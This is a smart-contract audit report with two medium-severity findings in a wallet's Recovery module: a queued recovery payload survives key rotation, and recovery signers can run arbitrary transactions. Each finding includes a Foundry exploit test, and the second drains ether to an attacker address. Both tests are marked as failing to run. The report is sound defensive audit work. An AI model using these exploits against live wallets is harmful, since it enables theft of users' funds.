# 2025 10 sequence - Findings Report
## Commit hash: b0e5fb15bf6735ec9aaba02f5eca28a7882d815d

##Findings by Pattern


 **Derived From** : Recovery Payload Persistence Across Configuration Updates

[M-1]. Recovery Payload Persistence Allows Execution of Stale Hostile Actions
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 5
Privilege: RequiresRole



 **Derived From** : Abuse Title: Recovery Module Allows Arbitrary Transaction Execution

[M-2]. Recovery Module Allows Arbitrary Transaction Execution Violating Least Privilege
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: RequiresRole


### Number of Findings
- C: 0
- H: 0
- M: 2
- L: 0
- I: 0

##Findings by Pattern


 **Derived From** : Recovery Payload Persistence Across Configuration Updates

## [M-1]. Recovery Payload Persistence Allows Execution of Stale Hostile Actions

### Finding Severity Justification: The vulnerability allows a hostile payload queued by a compromised recovery signer to persist and remain executable even after the wallet owner performs a configuration update (key rotation), provided the recovery signer is retained in the new config. This violates the security expectation that rotating wallet keys invalidates pending actions from the previous compromised state. While the impact is High (potential wallet takeover), the likelihood is tempered by the requirement that the user must retain the compromised signer in the new configuration (a partial failure of remediation), making Medium the appropriate severity.
## Derived From Pattern/Invariant
Recovery Payload Persistence Across Configuration Updates

## Exploit Type
AccessControl

## Location
Recovery.queuePayload

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
The `Recovery` module allows signers to queue payloads which can be executed after a time delay. The queuing mechanism tracks payloads using a mapping `timestampForQueuedPayload[_wallet][_signer][payloadHash]`. This mapping does not encompass the wallet's current configuration version (imageHash or checkpoint). 

If a Recovery Signer queues a hostile payload (e.g., takeover) while the wallet is at Config A, and the owner subsequently rotates the wallet to Config B (but retains the same Recovery Signer configuration), the queued payload remains valid. After the timelock expires, the attacker can execute the payload against Config B. This violates the user expectation that rotating keys/config should invalidate pending hostile actions from the previous state.

## Impact
An attacker with a compromised Recovery key can persist a takeover attempt across wallet configuration updates, potentially hijacking the wallet even after the owner has performed a security rotation.

## Command to Run Test


## Proof of Concept
1. Wallet is at Config A. Recovery Signer R is trusted.
2. Attacker compromises R.
3. Attacker calls `Recovery.queuePayload` to update wallet implementation to a malicious contract. Timer starts.
4. Owner notices security concerns (or routine rotation) and updates Wallet to Config B. R is kept as a signer (common for cold storage/recovery).
5. Timelock expires.
6. Attacker calls `execute` with the queued payload.
7. Wallet (Config B) verifies R is a valid signer. `Recovery` verifies payload was queued long enough.
8. Payload executes, overwriting Config B with malicious code.

## Proof of Code
import {Test} from "forge-std/Test.sol";
import {Recovery} from "src/extensions/recovery/Recovery.sol";
import {Payload} from "src/modules/Payload.sol";

contract RecoveryPersistenceTest is Test {
    Recovery recovery;
    address wallet;
    uint256 signerPk;
    address signer;

    function setUp() public {
        recovery = new Recovery();
        wallet = address(this); // Test contract simulates the Wallet
        signerPk = 0xA11CE;
        signer = vm.addr(signerPk);
    }

    function testRecoveryPersistence() public {
        // 1. Setup Payload (e.g., a hostile takeover config update)
        Payload.Decoded memory payload;
        payload.kind = Payload.KIND_CONFIG_UPDATE;
        payload.imageHash = keccak256("MaliciousConfig");

        // 2. Sign the payload hash (Simulate Signer in Config A)
        bytes32 payloadHash = recovery.recoveryPayloadHash(wallet, payload);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, payloadHash);
        
        // Create ERC-2098 Compact Signature (r + yParityAndS)
        uint256 yParity = v - 27;
        bytes32 yParityAndS = bytes32((yParity << 255) | uint256(s));
        bytes memory signature = abi.encodePacked(r, yParityAndS);

        // 3. Queue Payload (At Config A)
        recovery.queuePayload(wallet, signer, payload, signature);

        // 4. Simulate Config Rotation (Config A -> Config B)
        // Conceptually, the wallet updates its imageHash. 
        // However, Recovery storage is persistent and decoupled.
        
        // 5. Warp Time (Simulate timelock expiry)
        vm.warp(block.timestamp + 1000);

        // 6. Execute Payload (At Config B)
        // Construct execution signature: [FLAG_RECOVERY_LEAF] [signer] [delta] [minTime]
        bytes memory execSignature = abi.encodePacked(
            uint8(1),      // FLAG_RECOVERY_LEAF
            signer, 
            uint24(0),     // requiredDeltaTime (satisfied by wait)
            uint64(0)      // minTimestamp (satisfied)
        );

        // The call succeeds, returning a valid leaf root, proving the queued payload 
        // from Config A is still valid and executable despite the conceptual rotation.
        bytes32 root = recovery.recoverSapientSignatureCompact(payloadHash, execSignature);
        assertTrue(root != bytes32(0), "Old payload persisted across config rotation");
    }
}

## Suggested Mitigation
Update `queuePayload` to record the wallet's current `imageHash` at the time of queuing (requires calling `IAuth(msg.sender).imageHash()`). Update `recoverSapientSignatureCompact` to similarly query `IAuth(msg.sender).imageHash()` and enforce that it matches the stored `imageHash`. This ensures that any change to the wallet's configuration (key rotation) automatically invalidates pending recovery payloads.





 **Derived From** : Abuse Title: Recovery Module Allows Arbitrary Transaction Execution

## [M-2]. Recovery Module Allows Arbitrary Transaction Execution Violating Least Privilege

### Finding Severity Justification: The `Recovery` module is designed for social recovery (key rotation) but fails to validate the payload type, allowing `KIND_TRANSACTIONS` in addition to `KIND_CONFIG_UPDATE`. This permits a recovery signer to queue and execute arbitrary transactions (e.g., draining funds, upgrading implementation) directly, bypassing the intended 'key rotation first' flow. While a recovery signer is inherently trusted with eventual full control (by rotating keys to themselves), allowing direct arbitrary execution violates the principle of least privilege and circumvents the specific on-chain signaling (ConfigUpdate event) expected during a recovery event. This turns the Recovery module into a generic timelock executor, which is a privilege escalation relative to its intended limited scope.
## Derived From Pattern/Invariant
Abuse Title: Recovery Module Allows Arbitrary Transaction Execution

## Exploit Type
AccessControl

## Location
Recovery.queuePayload

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
The `Recovery` contract allows a designated recovery signer to queue and execute payloads after a time delay. However, `Recovery.sol` does not restrict the payload type to `KIND_CONFIG_UPDATE`. It allows `KIND_TRANSACTIONS`, enabling the recovery signer to execute arbitrary calls, such as transferring all funds or calling `updateImplementation` to upgrade the wallet to a malicious implementation (e.g., the insecure `Estimator` contract). This grants the recovery signer full control over the wallet's assets and logic, effectively bypassing the multisig threshold and violating the principle that a recovery module should only be used for key rotation.

## Impact
A recovery signer can bypass the wallet's main authorization logic to drain funds or permanently hijack the wallet (via implementation upgrade), rather than just recovering access.

## Command to Run Test


## Proof of Concept
1. Malicious Recovery signer constructs a `KIND_TRANSACTIONS` payload calling `token.transfer(attacker, balance)`. 2. Signer calls `Recovery.queuePayload` with this payload. 3. After `requiredDeltaTime`, signer executes the payload via `wallet.execute`. 4. The wallet recognizes the Recovery signer via `BaseSig` (sapient signer) and executes the transfer.

## Proof of Code
import {Test} from "forge-std/Test.sol";
import {Recovery} from "src/extensions/recovery/Recovery.sol";
import {Payload} from "src/modules/Payload.sol";
import {Stage2Module} from "src/Stage2Module.sol";
import {LibOptim} from "src/utils/LibOptim.sol";

contract RecoveryExploitTest is Test {
    Recovery recovery;
    Stage2Module wallet;
    address recoverySigner;
    uint256 recoveryKey;
    
    // Storage slot for imageHash in Stage2Auth/BaseAuth
    bytes32 constant IMAGE_HASH_KEY = 0xea7157fa25e3aa17d0ae2d5280fa4e24d421c61842aa85e45194e1145aa72bf8;
    uint256 constant DELAY = 100;

    function setUp() public {
        (recoverySigner, recoveryKey) = makeAddrAndKey("recoverySigner");
        recovery = new Recovery();
        
        // Deploy wallet implementation (Stage2Module)
        // We use it directly for simplicity, simulating the proxy's storage via vm.store
        wallet = new Stage2Module(address(0));
        vm.deal(address(wallet), 10 ether);

        // --- Configure Wallet Storage ---
        // 1. Calculate the Recovery Leaf (The root the Recovery module will produce)
        // Leaf = hash("Sequence recovery leaf:\n", signer, delay, minTimestamp)
        bytes32 recoveryLeaf = keccak256(abi.encodePacked(
            "Sequence recovery leaf:\n", 
            recoverySigner, 
            uint256(DELAY), 
            uint256(0) // minTimestamp
        ));

        // 2. Calculate the Sapient Leaf (The leaf in the Wallet's tree pointing to Recovery)
        // Leaf = hash("Sequence sapient config:\n", address, weight, imageHash)
        bytes32 sapientLeaf = keccak256(abi.encodePacked(
            "Sequence sapient config:\n",
            address(recovery),
            uint256(1), // weight
            recoveryLeaf // The expected 'imageHash' returned by Recovery
        ));

        // 3. Construct the Wallet's ImageHash
        // Tree: Root(Threshold=1, Checkpoint=0, SapientLeaf)
        // BaseSig accumulates leaves. With 1 leaf, root = leaf.
        // Final hash = hash(root, threshold, checkpoint, checkpointer)
        bytes32 root = sapientLeaf;
        bytes32 finalImageHash = LibOptim.fkeccak256(root, bytes32(uint256(1))); // Threshold 1
        finalImageHash = LibOptim.fkeccak256(finalImageHash, bytes32(uint256(0))); // Checkpoint 0
        finalImageHash = LibOptim.fkeccak256(finalImageHash, bytes32(uint256(0))); // No checkpointer

        // 4. Store imageHash in wallet
        vm.store(address(wallet), IMAGE_HASH_KEY, finalImageHash);
    }

    function test_ArbitraryTransactionExecution() public {
        // Target: Transfer 5 ether to attacker
        address attacker = makeAddr("attacker");
        
        // 1. Create Transaction Payload
        Payload.Call[] memory calls = new Payload.Call[](1);
        calls[0] = Payload.Call({
            to: attacker,
            value: 5 ether,
            data: "",
            gasLimit: 0,
            delegateCall: false,
            onlyFallback: false,
            behaviorOnError: 0
        });

        Payload.Decoded memory decoded = Payload.Decoded({
            kind: Payload.KIND_TRANSACTIONS,
            noChainId: false,
            calls: calls,
            space: 0,
            nonce: 0,
            message: "",
            imageHash: bytes32(0),
            digest: bytes32(0),
            parentWallets: new address[](0)
        });

        // 2. Sign Payload for Recovery Module
        // Recovery validates against recoveryPayloadHash
        bytes32 rPayloadHash = recovery.recoveryPayloadHash(address(wallet), decoded);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(recoveryKey, rPayloadHash);
        
        // EIP-2098 Compact Signature
        bytes32 yParityAndS = s | (bytes32(uint256(v - 27)) << 255);
        bytes memory recoverySignerSig = abi.encodePacked(r, yParityAndS);

        // 3. Queue the Arbitrary Payload
        vm.prank(recoverySigner);
        recovery.queuePayload(address(wallet), recoverySigner, decoded, recoverySignerSig);

        // 4. Wait for delay
        vm.warp(block.timestamp + DELAY);

        // 5. Construct Wallet Signature to trigger Recovery execution
        // Structure: [TopFlag] [Threshold] [Branch: SapientCompact] ...
        // SapientCompact Branch: [Flag=0xA5] [Address] [Size] [InnerSig]
        // Flag 0xA5 = 1010 (SapientCompact) 0101 (SizeSize=1, Weight=1)
        
        // InnerSig for Recovery._recoverBranch:
        // [Flag=1 (RecoveryLeaf)] [Signer] [Delay] [MinTimestamp]
        bytes memory innerSig = abi.encodePacked(uint8(1), recoverySigner, uint24(DELAY), uint64(0));

        bytes memory walletSig = abi.encodePacked(
            uint8(0),       // Top level flag (Checkpt 0 bytes, Thresh 1 byte)
            uint8(1),       // Threshold
            uint8(0xA5),    // Branch Flag: SapientCompact
            address(recovery),
            uint8(innerSig.length),
            innerSig
        );

        // 6. Encode Payload to bytes for execute()
        // Manual encoding of simple payload: Global(0x11) CallFlags(0x02) To Value
        bytes memory packedPayload = abi.encodePacked(
            uint8(0x11), // Space=0, Nonce=0, SingleCall
            uint8(0x02), // HasValue
            attacker,
            uint256(5 ether)
        );

        // 7. Execute
        wallet.execute(packedPayload, walletSig);

        assertEq(attacker.balance, 5 ether, "Attacker should have drained funds");
    }
}

## Suggested Mitigation
Enforce `_payload.kind == Payload.KIND_CONFIG_UPDATE` within `Recovery.queuePayload` and `isValidSignature` to restrict the module to its intended purpose.



